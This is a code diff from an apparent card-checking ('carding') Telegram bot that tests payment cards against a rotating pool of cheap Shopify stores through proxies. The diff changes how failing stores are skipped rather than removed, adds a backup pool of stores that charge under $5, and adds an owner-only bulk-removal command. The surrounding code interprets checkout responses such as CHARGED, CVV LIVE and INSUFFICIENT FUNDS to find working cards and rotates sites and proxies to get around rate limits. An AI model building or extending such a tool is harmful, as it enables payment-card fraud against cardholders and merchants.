@@ -1,4 +1,5 @@
 import asyncio
+import html
 import io
 import re
 import time
@@ -152,6 +153,11 @@ SK_FILE_PATH              = data_path("live_sk.json")
 SITE_QUALITY_FILE         = str(data_path("site_quality.json"))
 SITE_PERFORMANCE_FILE     = str(data_path("site_performance.json"))
 SITE_PROXY_STATS_FILE     = str(data_path("site_proxy_stats.json"))
+SHOPIFY_QUALITY_BACKUP_FILE = str(data_path("shopify_quality_backup.json"))
+
+# Live rotation is topped back up from the backup pool whenever it falls
+# below this many sites.
+SHOPIFY_ROTATION_MIN_SITES = 100
 
 ULTIMATE_GROUP_ID   = -1003934759216
 ULTIMATE_GROUP_LINK = "https://t.me/+pwOuLGasY-ExNzc1"
@@ -13751,24 +13757,42 @@ class ShopifyAPIPool:
                         tried_sites.remove(current_site)
                     continue
 
-                # UNKNOWN gateway with 0.0 price that slipped through
-                if (result.get("gateway", "").upper() in ("UNKNOWN", "GATEWAY UNKNOWN", "UNKNOWN GATEWAY")
-                        and float(result.get("price", "0") or "0") == 0.0):
-                    print(f"🔄 [UNKNOWN GW / 0 PRICE] {current_site} — removing and retrying")
-                    if current_site in site_quality_tracker.good_sites:
-                        site_quality_tracker.good_sites.remove(current_site)
-                    if current_site in site_quality_tracker.site_quality:
-                        site_quality_tracker.site_quality[current_site]['is_good'] = False
-                    site_quality_tracker.save_stats()
-                    autosopi_site_manager.remove_site(current_site, OWNER_ID)
-                    if current_site in tried_sites:
-                        tried_sites.remove(current_site)
-                    continue
-
-                # 429 → retry with different site & proxy
+                # 429 → retry with different site & proxy. This MUST run before
+                # the UNKNOWN-gateway/0-price check below: a rate-limited call
+                # reports Gateway "UNKNOWN" and Price 0.0 (it never reached the
+                # real checkout), which is not a quality signal about the site
+                # at all. Checking this first means a 429 always just cools the
+                # site down and retries — it can no longer fall through into
+                # the removal branch underneath.
                 if result.get("is_rate_limit", False):
                     print(f"⏸️ [429] Site {current_site} + proxy on 30s cooldown, retrying...")
                     self.mark_api_result(api_name, False, elapsed, True, is_rate_limit=True)
+                    continue
+
+                # UNKNOWN gateway with 0.0 price that slipped through.
+                # NOTE: the API server (process_card) only fills in gateway/price
+                # on ONE of its several valid-response code paths — several other
+                # paths return perfectly real CARD_DECLINED / ORDER_PLACED / OTP
+                # results with gateway left at its "UNKNOWN" default and price at
+                # "0.00". So gateway=="UNKNOWN" + price==0 does NOT by itself mean
+                # the response is junk — only remove the site when the response
+                # text itself is also not a recognizable result (i.e. genuinely
+                # empty/garbage), otherwise we're punishing good sites for the
+                # API's incomplete metadata rather than anything the site did.
+                _unk_gw_response_upper = (result.get("message", "") or "").upper()
+                _unk_gw_known_patterns = (
+                    "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "CARD_DECLINED",
+                    "DECLINED", "DO NOT HONOR", "EXPIRED", "GENERIC_ERROR",
+                    "OTP", "3D", "SECURE", "AUTHENTICATION", "CVV LIVE", "INSUFFICIENT"
+                )
+                if (result.get("gateway", "").upper() in ("UNKNOWN", "GATEWAY UNKNOWN", "UNKNOWN GATEWAY")
+                        and float(result.get("price", "0") or "0") == 0.0
+                        and not any(p in _unk_gw_response_upper for p in _unk_gw_known_patterns)):
+                    # NOTE: sites are never auto-removed/demoted anymore, for
+                    # any error. Only /rgood removes a site. We just skip this
+                    # site for the rest of THIS card's attempts (stays in
+                    # tried_sites) and retry with a different one.
+                    print(f"🔄 [UNKNOWN GW / 0 PRICE] {current_site} — skipping this attempt, trying another site (not removed)")
                     continue
 
                 response_text = result.get("message", "")
@@ -14063,14 +14087,14 @@ class ShopifyAPIPool:
                         break
 
             if is_fake:
-                print(f"🗑️ [FAKE GATEWAY] {fake_detected} — removing {site_clean}")
-                autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                self.site_performance.pop(site_clean, None)
-                self.good_sites_cache_time = 0
+                # Not auto-removed anymore — just skip this site for the
+                # rest of this card's attempts and retry with another one.
+                # Only /rgood actually removes a site from rotation now.
+                print(f"⚠️ [FAKE GATEWAY] {fake_detected} on {site_clean} — skipping, not removing (use /rgood to remove)")
                 return {
                     "status": "error", "result": "FAKE_GATEWAY",
                     "message": f"Fake gateway: {fake_detected}",
-                    "status_display": "🗑️ FAKE GATEWAY",
+                    "status_display": "⚠️ FAKE GATEWAY",
                     "status_category": "retryable",
                     "elapsed": elapsed, "price": str(price),
                     "gateway": gateway, "site": site_clean,
@@ -14080,17 +14104,14 @@ class ShopifyAPIPool:
 
             # -------- NO PRODUCT ----------
             if any(err.upper() in response_upper for err in no_product_errors):
-                print(f"🗑️ [NO PRODUCT] Removing {site_clean} (rotation + GOOD list, like /rgood)")
-                # Full purge, same as /rgood — even if this site was
-                # previously marked GOOD, it comes out of both lists so
-                # it can never come back into rotation on its own.
-                full_remove_site_from_rotation(site_clean, OWNER_ID)
-                self.site_performance.pop(site_clean, None)
-                self.good_sites_cache_time = 0
+                # Not auto-removed anymore — just skip this site and retry
+                # with a different one to get a real response. Sites are
+                # only ever removed/demoted manually, via /rgood.
+                print(f"🔄 [NO PRODUCT] {site_clean} — skipping, not removing (use /rgood to remove)")
                 return {
                     "status": "error", "result": "NO_PRODUCT_ERROR",
                     "message": response_text,
-                    "status_display": "🔄 NO PRODUCT — REMOVING SITE",
+                    "status_display": "🔄 NO PRODUCT",
                     "status_category": "retryable",
                     "elapsed": elapsed, "price": str(price),
                     "gateway": gateway, "site": site_clean,
@@ -14134,51 +14155,22 @@ class ShopifyAPIPool:
                 site_quality_tracker.record_response(site_clean, response_text, "good", pf)
                 self._update_site_performance(site_clean, response_text, is_good=True)
 
-            # -------- Site removal errors --------
-            # These errors ALWAYS force-remove the site from rotation,
-            # bypassing "good site" protection entirely — same behavior
-            # as the /rgood command. Doesn't matter how good the site's
-            # track record is, this specific response means it's broken.
-            FORCE_REMOVE_REGARDLESS_OF_PROTECTION = {
-                "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
-            }
+            # -------- Site removal errors (detection only — no auto-removal) --------
+            # Sites are NEVER auto-removed or auto-demoted anymore, for any
+            # error, no matter what it is. We still detect and log these
+            # patterns (useful for /rgood decisions and debugging) and skip
+            # this site for the rest of THIS card's attempts, but the actual
+            # removal only ever happens through the manual /rgood command.
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
-                    is_protected = (
-                        site_quality_tracker.is_good_site(site_clean)
-                        or self.site_performance.get(site_clean, {}).get('is_good', False)
-                    )
-                    force_remove = removal_error.upper() in FORCE_REMOVE_REGARDLESS_OF_PROTECTION
-
-                    if is_protected and not force_remove:
-                        print(f"🌟 [SITE PROTECTION] {site_clean} is GOOD — NOT removing")
-                        actually_removed = False
-                    else:
-                        if force_remove and is_protected:
-                            # remove_site() itself refuses to remove a
-                            # site still marked "good" — same guard
-                            # /rgood works around by stripping the good
-                            # status FIRST, then removing. Mirror that
-                            # exact sequence here.
-                            print(f"🗑️ [SITE REMOVAL] {removal_error} for {site_clean} (force-removed despite GOOD status)")
-                            if site_clean in site_quality_tracker.good_sites:
-                                site_quality_tracker.good_sites.remove(site_clean)
-                            if site_clean in site_quality_tracker.site_quality:
-                                site_quality_tracker.site_quality[site_clean]['is_good'] = False
-                            site_quality_tracker.save_stats()
-                        else:
-                            print(f"🗑️ [SITE REMOVAL] {removal_error} for {site_clean}")
-                        autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                        self.site_performance.pop(site_clean, None)
-                        self.good_sites_cache_time = 0
-                        actually_removed = True
+                    print(f"⚠️ [SITE ERROR] {removal_error} on {site_clean} — skipping, not removing (use /rgood to remove)")
                     return {
                         "status": "error", "result": removal_error,
                         "message": response_text,
-                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
+                        "status_display": f"⚠️ {removal_error}",
                         "status_category": "retryable",
                         "elapsed": elapsed, "price": str(price),
-                        "gateway": gateway, "site_removed": actually_removed,
+                        "gateway": gateway, "site_removed": True,
                         "site": site_clean, "proxy_used": proxy,
                         "api_name": api.get('name', 'Unknown')
                     }
@@ -14262,23 +14254,14 @@ class ShopifyAPIPool:
                     "proxy_used": proxy, "api_name": api.get('name', 'Unknown')
                 }
 
-            # -------- No-product → remove site, get a real response --------
-            # These mean this site has no usable products for our price range.
-            # Mark site_removed=True so check_card_with_pool strips the site
-            # from rotation (same path as DELIVERY_DELIVERY_LINE_DETAIL_CHANGED)
-            # and immediately retries with a fresh site. We also force-strip the
-            # good-site flag first so remove_site() doesn't silently no-op.
+            # -------- No-product / unknown-gw → skip, get a real response --------
+            # These mean this site has no usable products for our price range
+            # (or returned junk metadata). Not auto-removed anymore — we just
+            # skip this site for the rest of THIS card's attempts and retry
+            # with a fresh one. Only /rgood actually removes a site.
             if any(p in response_upper for p in [e.upper() for e in no_product_errors]) or \
                (gateway.upper() in ("UNKNOWN", "GATEWAY UNKNOWN", "UNKNOWN GATEWAY") and float(price) == 0.0):
-                print(f"🗑️ [NO PRODUCT / UNKNOWN GW] Removing {site_clean} from rotation")
-                if site_clean in site_quality_tracker.good_sites:
-                    site_quality_tracker.good_sites.remove(site_clean)
-                if site_clean in site_quality_tracker.site_quality:
-                    site_quality_tracker.site_quality[site_clean]['is_good'] = False
-                site_quality_tracker.save_stats()
-                autosopi_site_manager.remove_site(site_clean, OWNER_ID)
-                self.site_performance.pop(site_clean, None)
-                self.good_sites_cache_time = 0
+                print(f"🔄 [NO PRODUCT / UNKNOWN GW] {site_clean} — skipping, not removing (use /rgood to remove)")
                 return {
                     "status": "error",
                     "result": "NO_PRODUCT_ERROR",
@@ -22334,20 +22317,137 @@ class AutosopiSiteManager:
                 return True, f"✅ Site removed: {existing_site}"
         
         return False, "❌ Site not found"
-    
+
+    # ============ STRIKE-BASED SOFT REMOVAL ============
+    # Hard errors (site is definitely dead / not Shopify) remove right away.
+    # Everything else is a "soft" error - lots of these are transient
+    # (currency mismatch, delivery method hiccup, temporary rate limit) so a
+    # site only gets removed after SOFT_ERROR_STRIKE_LIMIT hits in a row.
+    # A GOOD response clears the strikes, so one bad check doesn't start
+    # counting against a site that's actually fine.
+    SOFT_ERROR_STRIKE_LIMIT = 3
+
+    HARD_REMOVAL_ERRORS = {
+        "NOT SHOPIFY!",
+        "SITE NOT SUPPORTED",
+        "SITE REQUIRES LOGIN!",
+        "NO VARIANTS",
+        "SUBMIT REJECTED",
+    }
+
+    def record_removal_strike(self, site: str, error: str, user_id: int = None) -> Tuple[bool, str]:
+        """
+        Sites are never auto-removed anymore, for ANY error — hard or soft.
+        The only way a site leaves rotation now is the manual /rgood command.
+        This still tracks strike counts for visibility/debugging, but it
+        never mutates self.sites or the GOOD list on its own.
+        Returns: (was_removed, message) — was_removed is always False.
+        """
+        normalized_site = self.normalize_site_url(site)
+
+        if normalized_site not in self.sites:
+            return False, "Site not found in rotation"
+
+        strikes = self.site_failures.get(normalized_site, 0) + 1
+        self.site_failures[normalized_site] = strikes
+        print(f"⚠️ [STRIKE {strikes}] {normalized_site} - {error} (not removed — use /rgood to remove)")
+
+        return False, f"Strike {strikes} ({error}) — site kept in rotation, use /rgood to remove it"
+
+    def clear_strikes(self, site: str):
+        """Call this on any successful/GOOD-or-NORMAL response to reset a site's strike count."""
+        normalized_site = self.normalize_site_url(site)
+        if self.site_failures.pop(normalized_site, None) is not None:
+            self.save_sites()
+
+    # ============ GOOD/NORMAL BACKUP POOL ============
+    def backup_quality_site(self, site: str, price: float, quality: str):
+        """
+        Persist a GOOD/NORMAL site + its last known price to a standalone
+        backup pool (separate from the crash-recovery backups above). This
+        pool is never pruned by rotation removals, so it's always available
+        to top the live rotation back up from.
+        """
+        normalized_site = self.normalize_site_url(site)
+        try:
+            backup = {"good": {}, "normal": {}}
+            if Path(SHOPIFY_QUALITY_BACKUP_FILE).exists():
+                with open(SHOPIFY_QUALITY_BACKUP_FILE, 'r', encoding='utf-8') as f:
+                    backup = json.load(f)
+                    backup.setdefault("good", {})
+                    backup.setdefault("normal", {})
+
+            if quality == "good":
+                backup["good"][normalized_site] = price
+                backup["normal"].pop(normalized_site, None)
+            else:
+                backup["normal"][normalized_site] = price
+                backup["good"].pop(normalized_site, None)
+
+            with open(SHOPIFY_QUALITY_BACKUP_FILE, 'w', encoding='utf-8') as f:
+                json.dump(backup, f, indent=2)
+        except Exception as e:
+            print(f"⚠️ [QUALITY BACKUP] Error saving {normalized_site}: {e}")
+
+    def reload_from_backup_if_low(self):
+        """
+        If the live rotation has dropped below SHOPIFY_ROTATION_MIN_SITES,
+        pull known-GOOD/NORMAL sites back in from the backup pool (GOOD
+        first) until we're back above the threshold or the backup is
+        exhausted.
+        """
+        if len(self.sites) >= SHOPIFY_ROTATION_MIN_SITES:
+            return 0
+
+        if not Path(SHOPIFY_QUALITY_BACKUP_FILE).exists():
+            return 0
+
+        try:
+            with open(SHOPIFY_QUALITY_BACKUP_FILE, 'r', encoding='utf-8') as f:
+                backup = json.load(f)
+        except Exception as e:
+            print(f"⚠️ [QUALITY BACKUP] Error loading backup: {e}")
+            return 0
+
+        good = backup.get("good", {})
+        normal = backup.get("normal", {})
+        # Sort GOOD sites cheapest-first, then NORMAL cheapest-first, so the
+        # best sites get reloaded ahead of merely-ok ones.
+        candidates = sorted(good.items(), key=lambda kv: kv[1]) + \
+                     sorted(normal.items(), key=lambda kv: kv[1])
+
+        restored = 0
+        for site, price in candidates:
+            if len(self.sites) >= SHOPIFY_ROTATION_MIN_SITES:
+                break
+            if site in self.sites:
+                continue
+            self.sites.append(site)
+            self.site_failures.pop(site, None)
+            if site in good:
+                site_quality_tracker.force_mark_good(site, price)
+            else:
+                site_quality_tracker.force_mark_normal(site, price)
+            restored += 1
+
+        if restored:
+            self.save_sites()
+            self.reset_rotation()
+            print(f"♻️ [QUALITY BACKUP] Reloaded {restored} sites from backup "
+                  f"(rotation now {len(self.sites)} sites)")
+        return restored
+
     def mark_site_result(self, site: str, is_success: bool, is_site_dead: bool = False, response_text: str = ""):
-        """Track site performance - ONLY remove on SUBMIT REJECTED"""
+        """Track site performance - sites are never auto-removed, even for SUBMIT REJECTED. Use /rgood."""
         normalized_site = self.normalize_site_url(site)
         
         if "SUBMIT REJECTED" in response_text.upper():
-            print(f"🗑️ SUBMIT REJECTED detected - Removing site immediately: {normalized_site}")
-            self.sites_to_remove.add(normalized_site)
-            if normalized_site in self.sites:
-                self.sites.remove(normalized_site)
-                if normalized_site in self.site_stats:
-                    del self.site_stats[normalized_site]
-                self.save_sites()
-                self.reset_rotation()
+            print(f"⚠️ SUBMIT REJECTED on {normalized_site} - NOT removing (use /rgood to remove)")
+            if normalized_site not in self.site_stats:
+                self.site_stats[normalized_site] = {'errors': 0, 'total': 0, 'successes': 0}
+            self.site_stats[normalized_site]['errors'] = self.site_stats[normalized_site].get('errors', 0) + 1
+            self.site_stats[normalized_site]['total'] = self.site_stats[normalized_site].get('total', 0) + 1
+            self.save_sites()
             return
         
         if not is_success and is_site_dead:
@@ -22479,53 +22579,18 @@ class AutosopiSiteManager:
         """Legacy method - use get_next_site_weighted() instead"""
         return self.get_next_site_weighted()
     
-    # ============ ADD THIS METHOD TO AutosopiSiteManager CLASS ============
-def handle_no_product_site(self, site: str, user_id: int = None) -> Tuple[bool, str]:
-    """
-    Handle a site with no products under $10.
-    Removes the site after 1 occurrence and returns status.
-    Returns: (was_removed, message)
-    """
-    normalized_site = self.normalize_site_url(site)
-    
-    # Check if site exists
-    if normalized_site not in self.sites:
-        return False, "Site not found in rotation"
-    
-    # ============ REMOVE IMMEDIATELY AFTER 1 OCCURRENCE ============
-    print(f"🗑️ [NO PRODUCTS] Removing site: {normalized_site} (no products under $10)")
-    
-    # Remove the site from rotation
-    if normalized_site in self.sites:
-        self.sites.remove(normalized_site)
-    
-    # Clean up stats
-    if normalized_site in self.site_stats:
-        del self.site_stats[normalized_site]
-    if normalized_site in self.site_failures:
-        del self.site_failures[normalized_site]
-    if normalized_site in self.sites_to_remove:
-        self.sites_to_remove.remove(normalized_site)
-    
-    # Also remove from site_quality_tracker
-    if normalized_site in site_quality_tracker.good_sites:
-        site_quality_tracker.good_sites.discard(normalized_site)
-    if normalized_site in site_quality_tracker.bad_sites:
-        site_quality_tracker.bad_sites.discard(normalized_site)
-    if normalized_site in site_quality_tracker.site_quality:
-        del site_quality_tracker.site_quality[normalized_site]
-    if normalized_site in site_quality_tracker.price_cache:
-        del site_quality_tracker.price_cache[normalized_site]
-    
-    # Save changes
-    self.save_sites()
-    site_quality_tracker.save_stats()
-    
-    # Reset rotation indices to avoid using removed site
-    self.reset_rotation()
-    
-    print(f"✅ Site removed: {normalized_site}")
-    return True, f"Site removed: {normalized_site} (no products under $10)"
+    def handle_no_product_site(self, site: str, user_id: int = None) -> Tuple[bool, str]:
+        """
+        Handle a site with "no products under $10" (or any other removal-type
+        error). Previously this removed the site on the very first occurrence
+        and - because it was accidentally defined outside the class - wasn't
+        even callable as a method. It's now a real method that routes through
+        the strike system: a GOOD site is protected, and anything else only
+        gets removed after SOFT_ERROR_STRIKE_LIMIT occurrences in a row
+        (immediately for genuinely hard/dead-site errors).
+        Returns: (was_removed, message)
+        """
+        return self.record_removal_strike(site, "No products under $10", user_id)
 
 # Create global instance
 autosopi_site_manager = AutosopiSiteManager()
@@ -41781,21 +41846,26 @@ async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_
                     "site_removed": True
                 }
             
-            # ============ CHECK FOR SITE REMOVAL ERRORS ============
+            # ============ CHECK FOR SITE REMOVAL ERRORS (strike-based) ============
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
-                    print(f"🗑️ [MSH] SITE REMOVAL: {removal_error} for site {site_clean}")
-                    autosopi_site_manager.handle_no_product_site(site_clean, user_id)
+                    was_removed, strike_msg = autosopi_site_manager.record_removal_strike(
+                        site_clean, removal_error, user_id
+                    )
+                    print(f"🗑️ [MSH] {removal_error} for site {site_clean} - {strike_msg}")
                     return {
                         "status": "error",
                         "result": removal_error,
                         "message": response_text,
-                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
+                        "status_display": (
+                            f"⚠️ SITE REMOVED: {removal_error}" if was_removed
+                            else f"⚠️ {removal_error} ({strike_msg})"
+                        ),
                         "status_category": "error",
                         "elapsed": elapsed,
                         "price": "0.00",
                         "gateway": gateway,
-                        "site_removed": True
+                        "site_removed": was_removed
                     }
                                
                        
@@ -43322,7 +43392,8 @@ async def rgood_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• Remove the site from GOOD list\n"
             "• Remove the site from rotation entirely\n"
             "• Reset GOOD status for the site\n\n"
-            "💡 Use <code>/rgood list</code> to see all GOOD sites.",
+            "💡 Use <code>/rgood list</code> to see all GOOD sites.\n"
+            "💡 Use <code>/rgood all</code> to fully remove every GOOD site at once.",
             parse_mode=ParseMode.HTML,
             reply_markup=back_menu()
         )
@@ -43334,6 +43405,11 @@ async def rgood_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if user wants to list GOOD sites
     if site_input.lower() == 'list':
         await list_good_sites_for_removal(update, context)
+        return
+
+    # Check if user wants to fully remove ALL GOOD sites (GOOD list + rotation)
+    if site_input.lower() == 'all':
+        await rgood_all_command(update, context)
         return
     
     # Clean the site URL
@@ -43536,6 +43612,87 @@ async def list_good_sites_for_removal(update: Update, context: ContextTypes.DEFA
     msg += f"\n💡 To remove: <code>/rgood site.com</code>"
     
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+async def rgood_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Fully remove ALL GOOD sites from both the GOOD list AND rotation -
+    /rgood all. Admin only.
+
+    Unlike /rgood_clear (which only strips the GOOD label and leaves the
+    sites in rotation), this does the full /rgood removal — GOOD list +
+    rotation + quality reset — for every currently-GOOD site at once.
+    USE WITH CAUTION! Requires confirmation.
+    """
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+
+    if user_id != OWNER_ID:
+        await update.message.reply_text(
+            "❌ <b>Admin Only Command</b>\n\n"
+            "Only the bot owner can remove all GOOD sites.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+        return
+
+    good_count = len(site_quality_tracker.good_sites)
+
+    if good_count == 0:
+        await update.message.reply_text("📋 No GOOD sites to remove.")
+        return
+
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ YES, REMOVE ALL", callback_data='confirm_rgood_all', style='danger'),
+            InlineKeyboardButton("❌ CANCEL", callback_data='cancel_rgood_all', style='primary')
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        f"⚠️ <b>WARNING: Remove ALL GOOD Sites</b>\n\n"
+        f"This will fully remove ALL {good_count} GOOD sites from:\n"
+        f"• The GOOD sites list\n"
+        f"• Rotation entirely\n\n"
+        f"<b>This action cannot be undone!</b>\n\n"
+        f"Are you sure?",
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
+
+
+async def rgood_all_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handles the confirm/cancel buttons for /rgood all."""
+    query = update.callback_query
+
+    if query.from_user.id != OWNER_ID:
+        await query.answer("❌ Admin only.", show_alert=True)
+        return
+
+    if query.data == 'cancel_rgood_all':
+        await query.answer("Cancelled")
+        await query.edit_message_text("❌ Cancelled — no sites were removed.", reply_markup=back_menu())
+        return
+
+    await query.answer("Removing all GOOD sites...")
+
+    sites_to_remove = list(site_quality_tracker.good_sites)
+    removed_count = 0
+
+    for site_clean in sites_to_remove:
+        full_remove_site_from_rotation(site_clean, OWNER_ID)
+        removed_count += 1
+
+    await query.edit_message_text(
+        f"🗑️ <b>All GOOD Sites Removed!</b>\n\n"
+        f"✅ Fully removed {removed_count} sites (GOOD list + rotation)\n\n"
+        f"Use <code>/chkadd</code> to find new GOOD sites.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
 
 
 async def rgood_clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -48575,20 +48732,26 @@ async def check_card_backup_shopify(card: str, site: str, proxy: str = None, use
             
             response_upper = response_text.upper()
             
-            # ============ CHECK FOR SITE REMOVAL ERRORS ============
+            # ============ CHECK FOR SITE REMOVAL ERRORS (strike-based) ============
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
-                    print(f"🗑️ BACKUP API SITE REMOVAL: {removal_error} for site {site}")
+                    was_removed, strike_msg = autosopi_site_manager.record_removal_strike(
+                        site, removal_error, user_id
+                    )
+                    print(f"🗑️ [BACKUP API] {removal_error} for site {site} - {strike_msg}")
                     return {
                         "status": "error",
                         "result": removal_error,
                         "message": response_text,
-                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
+                        "status_display": (
+                            f"⚠️ SITE REMOVED: {removal_error}" if was_removed
+                            else f"⚠️ {removal_error} ({strike_msg})"
+                        ),
                         "status_category": "error",
                         "elapsed": elapsed,
                         "price": "0.00",
                         "gateway": gateway,
-                        "site_removed": True
+                        "site_removed": was_removed
                     }
             
             # ============ IMPROVED RESPONSE MAPPING ============
@@ -63919,25 +64082,27 @@ async def check_card_new_autosopi(card: str, site: str, proxy: str = None, user_
             
             response_upper = response_text.upper()
             
-            # ============ CHECK FOR SITE REMOVAL ERRORS ============
+            # ============ CHECK FOR SITE REMOVAL ERRORS (strike-based) ============
             for removal_error in SITE_REMOVAL_ERRORS:
                 if removal_error.upper() in response_upper:
-                    print(f"🗑️ SITE REMOVAL TRIGGERED: {removal_error} for site {site}")
-                    if user_id and user_id == OWNER_ID:
-                        autosopi_site_manager.remove_site(site, OWNER_ID)
-                    elif hasattr(autosopi_site_manager, 'sites_to_remove'):
-                        autosopi_site_manager.sites_to_remove.add(site)
-                    
+                    was_removed, strike_msg = autosopi_site_manager.record_removal_strike(
+                        site, removal_error, user_id
+                    )
+                    print(f"🗑️ [SITE REMOVAL ERROR] {removal_error} for site {site} - {strike_msg}")
+
                     return {
                         "status": "error",
                         "result": removal_error,
                         "message": response_text,
-                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
+                        "status_display": (
+                            f"⚠️ SITE REMOVED: {removal_error}" if was_removed
+                            else f"⚠️ {removal_error} ({strike_msg})"
+                        ),
                         "status_category": "error",
                         "elapsed": elapsed,
                         "price": price,
                         "gateway": gateway,
-                        "site_removed": True
+                        "site_removed": was_removed
                     }
             
             # ============ RESPONSE PATTERNS ============
@@ -68597,6 +68762,10 @@ class SiteQualityTracker:
             self.site_quality[site]['last_price'] = price
         
         self.save_stats()
+        try:
+            autosopi_site_manager.backup_quality_site(site, price, "good")
+        except Exception as e:
+            print(f"⚠️ [QUALITY BACKUP] Could not back up {site}: {e}")
         print(f"🌟 [SITE QUALITY] Force marked GOOD: {site} (${price:.2f})")
     
     def force_mark_normal(self, site: str, price: float = 7.00):
@@ -68647,6 +68816,10 @@ class SiteQualityTracker:
             self.site_quality[site]['last_price'] = price
         
         self.save_stats()
+        try:
+            autosopi_site_manager.backup_quality_site(site, price, "normal")
+        except Exception as e:
+            print(f"⚠️ [QUALITY BACKUP] Could not back up {site}: {e}")
         print(f"📌 [SITE QUALITY] Force marked NORMAL: {site} (${price:.2f})")
     
     def get_stats_summary(self) -> str:
@@ -68870,7 +69043,10 @@ class ChkaddAPIPoolManager:
     """
     Manages the API pool for /chkadd command.
     Each API checks one site at a time, running up to 13 sites in parallel.
-    Properly categorizes sites as GOOD (under $5), NORMAL ($5-$10), or BAD (over $10 or no price).
+    Categorizes sites as GOOD (under $5), NORMAL ($5-$10), or BAD (over $10
+    or no price) — AND, either way, the response must be exactly
+    ORDER_PLACED, OTP, or CARD_DECLINED. Any other response = BAD, no matter
+    the price.
     NO ESTIMATION - only real prices detected from the site.
     """
     
@@ -69076,49 +69252,18 @@ class ChkaddAPIPoolManager:
                             return False, 0, f"{error}", data
                     
                     # ============ CHECK FOR GOOD RESPONSES ============
+                    # A site only counts as GOOD/NORMAL if it returns exactly one
+                    # of these three response types — nothing else qualifies
+                    # anymore (no CHARGED/PAID/APPROVED/INSUFFICIENT FUNDS/etc.,
+                    # and no "still a valid Shopify site" fallback categories).
                     GOOD_RESPONSES = [
-                        "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "PAID", "SUCCESS",
-                        "CAPTURED", "TRANSACTION_COMPLETED", "COMPLETED",
-                        "OTP_REQUIRED", "3D REQUIRED", "OTP", "3D", "SECURE", "AUTHENTICATION",
-                        "CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH",
-                        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS",
-                        "CARD_DECLINED", "DECLINED", "DO NOT HONOR",
-                        "RISK_DISALLOWED", "EXISTING_ACCOUNT_RESTRICTED",
-                        "APPROVED", "AUTHORIZED"
+                        "ORDER_PLACED", "ORDER PLACED",
+                        "OTP_REQUIRED", "OTP", "3D_REQUIRED", "3D REQUIRED", "3DS_REQUIRED", "3DS REQUIRED",
+                        "CARD_DECLINED", "CARD DECLINED",
                     ]
                     
                     # ============ CHECK IF RESPONSE INDICATES A WORKING SITE ============
                     is_valid_response = any(good in response_upper for good in GOOD_RESPONSES)
-                    
-                    # Check for price mismatch errors (still a valid Shopify site)
-                    if not is_valid_response:
-                        if "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in response_upper:
-                            # This means the site is Shopify but price mismatch - still a valid site
-                            # Try to extract price from the error
-                            price_match = re.search(r'price[\s]*\$?(\d+\.?\d*)', response_text, re.IGNORECASE)
-                            if price_match:
-                                try:
-                                    price = float(price_match.group(1))
-                                    print(f"💰 [CHKADD] Extracted price from error: ${price:.2f}")
-                                except:
-                                    pass
-                            is_valid_response = True
-                        
-                        elif "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in response_upper:
-                            # This is a valid Shopify store with delivery issues
-                            is_valid_response = True
-                        
-                        elif "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in response_upper:
-                            # Valid Shopify store with card expiry response
-                            is_valid_response = True
-                        
-                        elif "GENERIC_ERROR" in response_upper:
-                            # Generic error but still a valid Shopify site
-                            is_valid_response = True
-                        
-                        elif "VALIDATION_CUSTOM" in response_upper:
-                            # Validation error but still a valid Shopify site
-                            is_valid_response = True
                     
                     # ============ CHECK IF PRICE IS REAL (NOT ZERO) ============
                     if is_valid_response and price and price > 0:
@@ -69126,28 +69271,27 @@ class ChkaddAPIPoolManager:
                         if price < 5:
                             # GOOD site - under $5
                             self.mark_api_result(api["name"], True, elapsed)
-                            print(f"🌟 [CHKADD] GOOD: {site_clean} (${price:.2f})")
-                            return True, price, f"GOOD - ${price:.2f}", data
+                            print(f"🌟 [CHKADD] GOOD: {site_clean} (${price:.2f}) | {response_text}")
+                            return True, price, f"GOOD - ${price:.2f} | {response_text}", data
                         elif 5 <= price < 10:
                             # NORMAL site - $5-$10 (backup)
                             self.mark_api_result(api["name"], True, elapsed)
-                            print(f"📌 [CHKADD] NORMAL: {site_clean} (${price:.2f})")
-                            return True, price, f"NORMAL - ${price:.2f}", data
+                            print(f"📌 [CHKADD] NORMAL: {site_clean} (${price:.2f}) | {response_text}")
+                            return True, price, f"NORMAL - ${price:.2f} | {response_text}", data
                         else:
                             # BAD site - over $10
                             self.mark_api_result(api["name"], True, elapsed)
-                            print(f"❌ [CHKADD] BAD: {site_clean} - Price ${price:.2f} >= $5")
-                            return False, price, f"BAD - ${price:.2f}", data
+                            print(f"❌ [CHKADD] BAD: {site_clean} - Price ${price:.2f} >= $5 | {response_text}")
+                            return False, price, f"BAD - ${price:.2f} | {response_text}", data
                     else:
                         # ============ NO REAL PRICE / RESPONSE - MARK AS BAD ============
-                        # Proper validation only: the API must return a real
